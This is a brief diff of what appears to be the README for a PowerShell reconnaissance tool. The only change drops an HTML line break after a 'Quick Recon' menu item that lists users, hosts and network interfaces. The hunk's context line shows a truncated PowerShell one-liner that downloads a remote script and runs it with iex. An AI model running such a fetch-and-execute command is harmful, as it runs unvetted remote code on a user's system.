@@ -13,7 +13,7 @@ powershell –nop –c “iex(New-Object Net.WebClient).DownloadString(‘https:
 
 <b> Help </b>
 
-Option 1: Quick Recon <br>
+Option 1: Quick Recon
 -	Lists User
 -	Lists Host
 -	Lists Network Interfaces
